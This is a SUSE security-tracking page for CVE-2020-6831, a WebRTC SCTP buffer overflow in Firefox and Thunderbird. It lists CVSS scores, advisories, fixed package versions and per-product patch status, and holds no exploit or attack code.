### Upstream information

[CVE-2020-6831 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6831)

#### Description

A buffer overflow could occur when parsing and validating SCTP chunks in WebRTC. This could have led to memory corruption and a potentially exploitable crash. This vulnerability affects Firefox ESR < 68.8, Firefox < 76, and Thunderbird < 68.8.0.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [important](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 7.5 |
| Vector | AV:N/AC:L/Au:N/C:P/I:P/A:P |
| Access Vector | Network |
| Access Complexity | Low |
| Authentication | None |
| Confidentiality Impact | Partial |
| Integrity Impact | Partial |
| Availability Impact | Partial |

[CVSS v3 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database | SUSE |
| Base Score | 9.8 | 7.5 |
| Vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H |
| Attack Vector | Network | Network |
| Attack Complexity | Low | High |
| Privileges Required | None | None |
| User Interaction | None | Required |
| Scope | Unchanged | Unchanged |
| Confidentiality Impact | High | High |
| Integrity Impact | High | High |
| Availability Impact | High | High |
| CVSSv3 Version | 3.1 | 3.1 |

SUSE Bugzilla entries: [1171186](https://bugzilla.suse.com/show_bug.cgi?id=1171186) [RESOLVED / FIXED], [1171247](https://bugzilla.suse.com/show_bug.cgi?id=1171247) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [SUSE-SU-2020:1209-1](https://lists.suse.com/pipermail/sle-security-updates/2020-May/006799.html), published Thu May 7 07:29:17 MDT 2020
* [SUSE-SU-2020:1218-1](https://lists.suse.com/pipermail/sle-security-updates/2020-May/006803.html), published Thu May 7 13:25:10 MDT 2020
* [SUSE-SU-2020:1225-1](https://lists.suse.com/pipermail/sle-security-updates/2020-May/006810.html), published Mon May 11 03:39:36 MDT 2020
* [SUSE-SU-2020:14359-1](https://lists.suse.com/pipermail/sle-security-updates/2020-May/006809.html), published Mon May 11 03:33:36 MDT 2020
* [openSUSE-SU-2020:0620-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/JZWG67WLLGB24KQGFWLQCE4EILVX3YVP/), published Thu Dec 7 12:55:39 2023
* [openSUSE-SU-2020:0621-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/EHIK2CEXF7KGEAHF2CFW2EEKLTCAFFXT/), published Thu Dec 7 12:55:39 2023
* [openSUSE-SU-2020:0643-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/5YQSDU3MFHQWYW5DLTHJ4JOYHWTHCHMN/), published Thu Dec 7 12:55:39 2023
* [openSUSE-SU-2020:0648-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/MZ2SKF2KGZ6HPXPWQGVRGGOFHMAFBYGT/), published Thu Dec 7 12:55:39 2023
* [openSUSE-SU-2020:0709-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/R4ZOZMMUQJP7KX3R3SO652IBWIRTED2C/), published Thu Dec 7 12:55:39 2023
* [openSUSE-SU-2020:0917-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/URGAZZH235MACHZERPNLFFODQWELZSF5/), published Thu Dec 7 12:55:40 2023
* [openSUSE-SU-2024:14572-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/3HI2RC7AJAHY74Q6MK7GNGWU6TITB22V/), published Fri Dec 13 18:51:22 2024

### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| HPE Helion OpenStack 8 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: HPE-Helion-OpenStack-8-2020-1218 |
| Image SLES15-SAP-Azure-LI-BYOS-Production Image SLES15-SAP-Azure-VLI-BYOS-Production Image SLES15-SP1-SAP-Azure-LI-BYOS-Production Image SLES15-SP1-SAP-Azure-VLI-BYOS-Production | * `MozillaFirefox >= 68.8.0-3.87.1` |  |
| SUSE Enterprise Storage 5 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-Storage-5-2020-1218 |
| SUSE Enterprise Storage 6 SUSE Linux Enterprise High Performance Computing 15 SP1 SUSE Linux Enterprise Module for Desktop Applications 15 SP1 SUSE Manager Proxy 4.0 SUSE Manager Retail Branch Server 4.0 SUSE Manager Server 4.0 | * `MozillaFirefox >= 68.8.0-3.87.1` * `MozillaFirefox-devel >= 68.8.0-3.87.1` * `MozillaFirefox-translations-common >= 68.8.0-3.87.1` * `MozillaFirefox-translations-other >= 68.8.0-3.87.1` | Patchnames: SUSE-SLE-Module-Desktop-Applications-15-SP1-2020-1209 |
| SUSE Enterprise Storage 7.1 SUSE Linux Enterprise High Performance Computing 15 SP3 SUSE Linux Enterprise Module for Desktop Applications 15 SP3 SUSE Manager Proxy 4.2 SUSE Manager Retail Branch Server 4.2 SUSE Manager Server 4.2 | * `MozillaFirefox >= 78.10.0-8.38.1` * `MozillaFirefox-devel >= 78.10.0-8.38.1` * `MozillaFirefox-translations-common >= 78.10.0-8.38.1` * `MozillaFirefox-translations-other >= 78.10.0-8.38.1` | Patchnames: SUSE Linux Enterprise Module for Desktop Applications 15 SP3 GA MozillaFirefox-78.10.0-8.38.1 |
| SUSE Enterprise Storage 7 SUSE Linux Enterprise High Performance Computing 15 SP2 SUSE Linux Enterprise Module for Desktop Applications 15 SP2 SUSE Manager Proxy 4.1 SUSE Manager Retail Branch Server 4.1 SUSE Manager Server 4.1 | * `MozillaFirefox >= 68.8.0-3.87.1` * `MozillaFirefox-devel >= 68.8.0-3.87.1` * `MozillaFirefox-translations-common >= 68.8.0-3.87.1` * `MozillaFirefox-translations-other >= 68.8.0-3.87.1` | Patchnames: SUSE Linux Enterprise Module for Desktop Applications 15 SP2 GA MozillaFirefox-68.8.0-3.87.1 |
| SUSE Liberty Linux 7 | * `firefox >= 68.8.0-1.el7_8` * `thunderbird >= 68.8.0-1.el7_8` | Patchnames: RHSA-2020:2037RHSA-2020:2050 |
| SUSE Liberty Linux 8 | * `firefox >= 68.8.0-1.el8_2` * `thunderbird >= 68.8.0-1.el8_2` | Patchnames: RHSA-2020:2031RHSA-2020:2046 |
| SUSE Linux Enterprise Desktop 12 SP4 SUSE Linux Enterprise Software Development Kit 12 SP4 | * `MozillaFirefox-devel >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SDK-12-SP4-2020-1218 |
| SUSE Linux Enterprise Desktop 15 SP1 SUSE Linux Enterprise Server 15 SP1 SUSE Linux Enterprise Server for SAP Applications 15 SP1 | * `MozillaFirefox >= 68.8.0-3.87.1` * `MozillaFirefox-devel >= 68.8.0-3.87.1` * `MozillaFirefox-translations-common >= 68.8.0-3.87.1` * `MozillaFirefox-translations-other >= 68.8.0-3.87.1` * `MozillaThunderbird >= 68.8.0-3.80.2` * `MozillaThunderbird-translations-common >= 68.8.0-3.80.2` * `MozillaThunderbird-translations-other >= 68.8.0-3.80.2` | Patchnames: SUSE-SLE-Module-Desktop-Applications-15-SP1-2020-1209SUSE-SLE-Product-WE-15-SP1-2020-1225 |
| SUSE Linux Enterprise Desktop 15 SP2 SUSE Linux Enterprise Server 15 SP2 SUSE Linux Enterprise Server for SAP Applications 15 SP2 | * `MozillaFirefox >= 68.8.0-3.87.1` * `MozillaFirefox-devel >= 68.8.0-3.87.1` * `MozillaFirefox-translations-common >= 68.8.0-3.87.1` * `MozillaFirefox-translations-other >= 68.8.0-3.87.1` * `MozillaThunderbird >= 68.8.0-3.80.2` * `MozillaThunderbird-translations-common >= 68.8.0-3.80.2` * `MozillaThunderbird-translations-other >= 68.8.0-3.80.2` | Patchnames: SUSE Linux Enterprise Module for Desktop Applications 15 SP2 GA MozillaFirefox-68.8.0-3.87.1SUSE Linux Enterprise Workstation Extension 15 SP2 GA MozillaThunderbird-68.8.0-3.80.2 |
| SUSE Linux Enterprise Desktop 15 SP3 SUSE Linux Enterprise Server 15 SP3 SUSE Linux Enterprise Server for SAP Applications 15 SP3 | * `MozillaFirefox >= 78.10.0-8.38.1` * `MozillaFirefox-devel >= 78.10.0-8.38.1` * `MozillaFirefox-translations-common >= 78.10.0-8.38.1` * `MozillaFirefox-translations-other >= 78.10.0-8.38.1` * `MozillaThunderbird >= 78.10.0-8.23.1` * `MozillaThunderbird-translations-common >= 78.10.0-8.23.1` * `MozillaThunderbird-translations-other >= 78.10.0-8.23.1` | Patchnames: SUSE Linux Enterprise Module for Desktop Applications 15 SP3 GA MozillaFirefox-78.10.0-8.38.1SUSE Linux Enterprise Workstation Extension 15 SP3 GA MozillaThunderbird-78.10.0-8.23.1 |
| SUSE Linux Enterprise Desktop 15 SP4 SUSE Linux Enterprise Server 15 SP4 SUSE Linux Enterprise Server for SAP Applications 15 SP4 | * `MozillaFirefox >= 91.8.0-150200.152.26.1` * `MozillaFirefox-devel >= 91.8.0-150200.152.26.1` * `MozillaFirefox-translations-common >= 91.8.0-150200.152.26.1` * `MozillaFirefox-translations-other >= 91.8.0-150200.152.26.1` * `MozillaThunderbird >= 91.8.0-150200.8.65.1` * `MozillaThunderbird-translations-common >= 91.8.0-150200.8.65.1` * `MozillaThunderbird-translations-other >= 91.8.0-150200.8.65.1` | Patchnames: SUSE Linux Enterprise Module for Desktop Applications 15 SP4 GA MozillaFirefox-91.8.0-150200.152.26.1SUSE Linux Enterprise Workstation Extension 15 SP4 GA MozillaThunderbird-91.8.0-150200.8.65.1 |
| SUSE Linux Enterprise Desktop 15 SP5 SUSE Linux Enterprise High Performance Computing 15 SP5 SUSE Linux Enterprise Module for Desktop Applications 15 SP5 SUSE Linux Enterprise Server 15 SP5 SUSE Linux Enterprise Server for SAP Applications 15 SP5 | * `MozillaFirefox >= 102.11.0-150200.152.87.1` * `MozillaFirefox-devel >= 102.11.0-150200.152.87.1` * `MozillaFirefox-translations-common >= 102.11.0-150200.152.87.1` * `MozillaFirefox-translations-other >= 102.11.0-150200.152.87.1` | Patchnames: SUSE Linux Enterprise Module for Desktop Applications 15 SP5 GA MozillaFirefox-102.11.0-150200.152.87.1 |
| SUSE Linux Enterprise Desktop 15 SP6 SUSE Linux Enterprise High Performance Computing 15 SP6 SUSE Linux Enterprise Module for Desktop Applications 15 SP6 SUSE Linux Enterprise Server 15 SP6 SUSE Linux Enterprise Server for SAP Applications 15 SP6 | * `MozillaFirefox >= 115.10.0-150200.152.134.1` * `MozillaFirefox-devel >= 102.12.0-150200.152.90.1` * `MozillaFirefox-translations-common >= 115.10.0-150200.152.134.1` * `MozillaFirefox-translations-other >= 115.10.0-150200.152.134.1` | Patchnames: SUSE Linux Enterprise Module for Desktop Applications 15 SP6 GA MozillaFirefox-115.10.0-150200.152.134.1SUSE Linux Enterprise Module for Desktop Applications 15 SP6 GA MozillaFirefox-devel-102.12.0-150200.152.90.1 |
| SUSE Linux Enterprise High Performance Computing 15 SP4 SUSE Linux Enterprise Module for Desktop Applications 15 SP4 SUSE Manager Proxy 4.3 SUSE Manager Retail Branch Server 4.3 SUSE Manager Server 4.3 | * `MozillaFirefox >= 91.8.0-150200.152.26.1` * `MozillaFirefox-devel >= 91.8.0-150200.152.26.1` * `MozillaFirefox-translations-common >= 91.8.0-150200.152.26.1` * `MozillaFirefox-translations-other >= 91.8.0-150200.152.26.1` | Patchnames: SUSE Linux Enterprise Module for Desktop Applications 15 SP4 GA MozillaFirefox-91.8.0-150200.152.26.1 |
| SUSE Linux Enterprise Point of Sale 12 SP2-CLIENT | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-POS-12-SP2-CLIENT-2020-1218 |
| SUSE Linux Enterprise Server 11 SP4-LTSS | * `MozillaFirefox >= 68.8.0-78.73.1` * `MozillaFirefox-translations-common >= 68.8.0-78.73.1` * `MozillaFirefox-translations-other >= 68.8.0-78.73.1` | Patchnames: slessp4-MozillaFirefox-14359 |
| SUSE Linux Enterprise Server 12 SP1-LTSS | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SERVER-12-SP1-2020-1218 |
| SUSE Linux Enterprise Server 12 SP2-BCL | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SERVER-12-SP2-BCL-2020-1218 |
| SUSE Linux Enterprise Server 12 SP2-ESPOS | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SERVER-12-SP2-ESPOS-2020-1218 |
| SUSE Linux Enterprise Server 12 SP2-LTSS | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SERVER-12-SP2-2020-1218 |
| SUSE Linux Enterprise Server 12 SP3-BCL | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SERVER-12-SP3-BCL-2020-1218 |
| SUSE Linux Enterprise Server 12 SP3-ESPOS | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SERVER-12-SP3-ESPOS-2020-1218 |
| SUSE Linux Enterprise Server 12 SP3-LTSS | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SERVER-12-SP3-2020-1218 |
| SUSE Linux Enterprise Server 12 SP4 SUSE Linux Enterprise Server for SAP Applications 12 SP4 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SDK-12-SP4-2020-1218SUSE-SLE-SERVER-12-SP4-2020-1218 |
| SUSE Linux Enterprise Server 12 SP5 SUSE Linux Enterprise Server for SAP Applications 12 SP5 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SDK-12-SP5-2020-1218SUSE-SLE-SERVER-12-SP5-2020-1218 |
| SUSE Linux Enterprise Server for SAP Applications 12 SP1 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SAP-12-SP1-2020-1218 |
| SUSE Linux Enterprise Server for SAP Applications 12 SP2 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SAP-12-SP2-2020-1218 |
| SUSE Linux Enterprise Server for SAP Applications 12 SP3 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SAP-12-SP3-2020-1218 |
| SUSE Linux Enterprise Software Development Kit 12 SP5 | * `MozillaFirefox-devel >= 68.8.0-109.119.1` | Patchnames: SUSE-SLE-SDK-12-SP5-2020-1218 |
| SUSE Linux Enterprise Workstation Extension 15 SP1 | * `MozillaThunderbird >= 68.8.0-3.80.2` * `MozillaThunderbird-translations-common >= 68.8.0-3.80.2` * `MozillaThunderbird-translations-other >= 68.8.0-3.80.2` | Patchnames: SUSE-SLE-Product-WE-15-SP1-2020-1225 |
| SUSE Linux Enterprise Workstation Extension 15 SP2 | * `MozillaThunderbird >= 68.8.0-3.80.2` * `MozillaThunderbird-translations-common >= 68.8.0-3.80.2` * `MozillaThunderbird-translations-other >= 68.8.0-3.80.2` | Patchnames: SUSE Linux Enterprise Workstation Extension 15 SP2 GA MozillaThunderbird-68.8.0-3.80.2 |
| SUSE Linux Enterprise Workstation Extension 15 SP3 | * `MozillaThunderbird >= 78.10.0-8.23.1` * `MozillaThunderbird-translations-common >= 78.10.0-8.23.1` * `MozillaThunderbird-translations-other >= 78.10.0-8.23.1` | Patchnames: SUSE Linux Enterprise Workstation Extension 15 SP3 GA MozillaThunderbird-78.10.0-8.23.1 |
| SUSE Linux Enterprise Workstation Extension 15 SP4 | * `MozillaThunderbird >= 91.8.0-150200.8.65.1` * `MozillaThunderbird-translations-common >= 91.8.0-150200.8.65.1` * `MozillaThunderbird-translations-other >= 91.8.0-150200.8.65.1` | Patchnames: SUSE Linux Enterprise Workstation Extension 15 SP4 GA MozillaThunderbird-91.8.0-150200.8.65.1 |
| SUSE OpenStack Cloud 7 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-devel >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-OpenStack-Cloud-7-2020-1218 |
| SUSE OpenStack Cloud 8 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-OpenStack-Cloud-8-2020-1218 |
| SUSE OpenStack Cloud Crowbar 8 | * `MozillaFirefox >= 68.8.0-109.119.1` * `MozillaFirefox-translations-common >= 68.8.0-109.119.1` | Patchnames: SUSE-OpenStack-Cloud-Crowbar-8-2020-1218 |
| SUSE Package Hub 15 SP1 | * `chromedriver >= 81.0.4044.138-bp151.3.82.2` * `chromium >= 81.0.4044.138-bp151.3.82.2` | Patchnames: openSUSE-2020-648 |
| openSUSE Leap 15.1 | * `MozillaFirefox >= 68.8.0-lp151.2.45.1` * `MozillaFirefox-branding-upstream >= 68.8.0-lp151.2.45.1` * `MozillaFirefox-buildsymbols >= 68.8.0-lp151.2.45.1` * `MozillaFirefox-devel >= 68.8.0-lp151.2.45.1` * `MozillaFirefox-translations-common >= 68.8.0-lp151.2.45.1` * `MozillaFirefox-translations-other >= 68.8.0-lp151.2.45.1` * `MozillaThunderbird >= 68.8.0-lp151.2.38.2` * `MozillaThunderbird-translations-common >= 68.8.0-lp151.2.38.2` * `MozillaThunderbird-translations-other >= 68.8.0-lp151.2.38.2` * `chromedriver >= 81.0.4044.138-lp151.2.88.1` * `chromium >= 81.0.4044.138-lp151.2.88.1` | Patchnames: openSUSE-2020-620openSUSE-2020-621openSUSE-2020-643 |
| openSUSE Leap 15.1 NonFree | * `opera >= 68.0.3618.104-lp151.2.18.1` | Patchnames: openSUSE-2020-709 |
| openSUSE Leap 15.2 | * `MozillaFirefox >= 68.9.0-lp152.1.3` * `MozillaFirefox-translations-common >= 68.9.0-lp152.1.3` * `MozillaFirefox-translations-other >= 68.9.0-lp152.1.3` * `MozillaThunderbird >= 68.9.0-lp152.1.4` * `MozillaThunderbird-translations-common >= 68.9.0-lp152.1.4` * `MozillaThunderbird-translations-other >= 68.9.0-lp152.1.4` * `chromium >= 83.0.4103.97-lp152.1.1` | Patchnames: openSUSE Leap 15.2 GA MozillaFirefox-68.9.0-lp152.1.1openSUSE Leap 15.2 GA MozillaThunderbird-68.9.0-lp152.1.1openSUSE Leap 15.2 GA chromium-83.0.4103.97-lp152.1.1 |
| openSUSE Leap 15.2 NonFree | * `opera >= 68.0.3618.104-lp152.2.6.1` | Patchnames: openSUSE-2020-917 |
| openSUSE Leap 15.3 | * `MozillaFirefox >= 78.10.0-8.38.1` * `MozillaFirefox-translations-common >= 78.10.0-8.38.1` * `MozillaFirefox-translations-other >= 78.10.0-8.38.1` * `MozillaThunderbird >= 78.10.0-bp153.1.1` * `MozillaThunderbird-translations-common >= 78.10.0-bp153.1.1` * `MozillaThunderbird-translations-other >= 78.10.0-bp153.1.1` * `chromium >= 90.0.4430.212-bp153.1.1` | Patchnames: openSUSE Leap 15.3 GA MozillaFirefox-78.10.0-8.38.1openSUSE Leap 15.3 GA MozillaThunderbird-78.10.0-8.23.1openSUSE Leap 15.3 GA chromium-90.0.4430.212-bp153.1.1 |
| openSUSE Leap 15.4 | * `MozillaFirefox >= 91.8.0-150200.152.26.1` * `MozillaFirefox-translations-common >= 91.8.0-150200.152.26.1` * `MozillaFirefox-translations-other >= 91.8.0-150200.152.26.1` * `MozillaThunderbird >= 91.8.0-150200.8.65.1` * `MozillaThunderbird-translations-common >= 91.8.0-150200.8.65.1` * `MozillaThunderbird-translations-other >= 91.8.0-150200.8.65.1` * `chromium >= 101.0.4951.64-bp154.1.2` | Patchnames: openSUSE Leap 15.4 GA MozillaFirefox-91.8.0-150200.152.26.1openSUSE Leap 15.4 GA MozillaThunderbird-91.8.0-150200.8.65.1openSUSE Leap 15.4 GA chromium-101.0.4951.64-bp154.1.2 |
| openSUSE Tumbleweed | * `MozillaFirefox >= 92.0-1.2` * `MozillaFirefox-branding-upstream >= 92.0-1.2` * `MozillaFirefox-devel >= 92.0-1.2` * `MozillaFirefox-translations-common >= 92.0-1.2` * `MozillaFirefox-translations-other >= 92.0-1.2` * `MozillaThunderbird >= 91.1.1-1.1` * `MozillaThunderbird-translations-common >= 91.1.1-1.1` * `MozillaThunderbird-translations-other >= 91.1.1-1.1` * `chromedriver >= 93.0.4577.82-1.1` * `chromium >= 93.0.4577.82-1.1` * `firefox-esr >= 128.5.1-1.1` * `firefox-esr-branding-upstream >= 128.5.1-1.1` * `firefox-esr-translations-common >= 128.5.1-1.1` * `firefox-esr-translations-other >= 128.5.1-1.1` * `ungoogled-chromium >= 113.0.5672.92-1.1` * `ungoogled-chromium-chromedriver >= 113.0.5672.92-1.1` | Patchnames: openSUSE-Tumbleweed-2024-10600openSUSE-Tumbleweed-2024-10601openSUSE-Tumbleweed-2024-10681openSUSE-Tumbleweed-2024-12948openSUSE-Tumbleweed-2024-14572 |

---

### Status of this issue by product and package

Please note that this evaluation state might be work in progress, incomplete or outdated. Also information for service packs in the LTSS phase is only included for issues meeting the LTSS criteria. If in doubt, feel free to contact us for clarification. The updates are grouped by state of their lifecycle. SUSE product lifecycles are documented [on the lifecycle page](https://www.suse.com/lifecycle/).

| Product(s) | Source package | State |
| --- | --- | --- |
| Products under general support and receiving all security fixes. | | |
| SUSE Linux Enterprise Desktop 15 SP5 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Desktop 15 SP6 | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP5 | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP5-ESPOS | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP5-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP6 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Module for Desktop Applications 15 SP5 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Module for Desktop Applications 15 SP6 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 SP5 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 SP5-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 SP6 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server for SAP Applications 15 SP5 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server for SAP Applications 15 SP6 | MozillaFirefox | Affected |
| SUSE Manager Proxy 4.3 | MozillaFirefox | Affected |
| SUSE Manager Retail Branch Server 4.3 | MozillaFirefox | Affected |
| SUSE Manager Server 4.3 | MozillaFirefox | Affected |
| openSUSE Leap 15.5 | MozillaFirefox | Affected |
| openSUSE Leap 15.6 | MozillaFirefox | Affected |
| Products under Long Term Service Pack support and receiving important and critical security fixes. | | |
| SUSE Linux Enterprise Desktop 15 SP4 | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 12 SP5 | MozillaFirefox | Released |
| SUSE Linux Enterprise High Performance Computing 15 SP2 | MozillaFirefox | Released |
| SUSE Linux Enterprise High Performance Computing 15 SP2-ESPOS | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP2-LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise High Performance Computing 15 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP3-ESPOS | MozillaFirefox | Released |
| SUSE Linux Enterprise High Performance Computing 15 SP3-LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise High Performance Computing 15 SP4 | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP4-ESPOS | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP4-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Module for Desktop Applications 15 SP2 | MozillaFirefox | Released |
| SUSE Linux Enterprise Module for Desktop Applications 15 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Module for Desktop Applications 15 SP4 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 12 SP5 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 12 SP5-LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 15 SP2 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 15 SP2 | MozillaThunderbird | Released |
| SUSE Linux Enterprise Server 15 SP2-LTSS | MozillaFirefox | Released |
| SUSE Linux Enterprise Server 15 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 SP3-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 SP4 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15 SP4-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise Server 15-ESPOS | MozillaFirefox | Unsupported |
| SUSE Linux Enterprise Server Business Critical Linux 15 SP1 | MozillaFirefox | Unsupported |
| SUSE Linux Enterprise Server Business Critical Linux 15 SP3 | MozillaFirefox | Unsupported |
| SUSE Linux Enterprise Server LTSS Extended Security 12 SP5 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 SP5 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server for SAP Applications 15 SP2 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server for SAP Applications 15 SP2 | MozillaThunderbird | Released |
| SUSE Linux Enterprise Server for SAP Applications 15 SP3 | MozillaFirefox | Released |
| SUSE Linux Enterprise Server for SAP Applications 15 SP4 | MozillaFirefox | Affected |
| Products past their end of life and not receiving proactive updates anymore. | | |
| HPE Helion OpenStack 8 | MozillaFirefox | Released |
| SUSE CaaS Platform 4.0 | MozillaFirefox | Affected |
| SUSE Enterprise Storage 5 | MozillaFirefox | Released |
| SUSE Enterprise Storage 6 | MozillaFirefox | Released |
| SUSE Enterprise Storage 7 | MozillaFirefox | Released |
| SUSE Enterprise Storage 7.1 | MozillaFirefox | Released |
| SUSE Linux Enterprise Desktop 11 SP2 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Desktop 11 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Desktop 11 SP4 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Desktop 12 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Desktop 12 SP1 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Desktop 12 SP2 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Desktop 12 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Desktop 12 SP4 | MozillaFirefox | Released |
| SUSE Linux Enterprise Desktop 15 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Desktop 15 | MozillaThunderbird | Affected |
| SUSE Linux Enterprise Desktop 15 SP1 | MozillaFirefox | Released |
| SUSE Linux Enterprise Desktop 15 SP1 | MozillaThunderbird | Released |
| SUSE Linux Enterprise Desktop 15 SP2 | MozillaFirefox | Released |
| SUSE Linux Enterprise Desktop 15 SP2 | MozillaThunderbird | Released |
| SUSE Linux Enterprise Desktop 15 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 12 SP4 | MozillaFirefox | Released |
| SUSE Linux Enterprise High Performance Computing 15 | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP1 | MozillaFirefox | Released |
| SUSE Linux Enterprise High Performance Computing 15 SP1-ESPOS | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15 SP1-LTSS | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15-ESPOS | MozillaFirefox | Affected |
| SUSE Linux Enterprise High Performance Computing 15-LTSS | MozillaFirefox | Unsupported |
| SUSE Linux Enterprise Module for Desktop Applications 15 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Module for Desktop Applications 15 SP1 | MozillaFirefox | Released |
| SUSE Linux Enterprise Point of Sale 11 SP3 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Point of Sale 12 SP2-CLIENT | MozillaFirefox | Released |
| SUSE Linux Enterprise Real Time 15 SP2 | MozillaFirefox | Affected |
| SUSE Linux Enterprise Real Time 15 SP3 | MozillaFirefox | Released |
| SUSE Linux Enterprise Real Time 15 SP4 | MozillaFirefox | Affected |
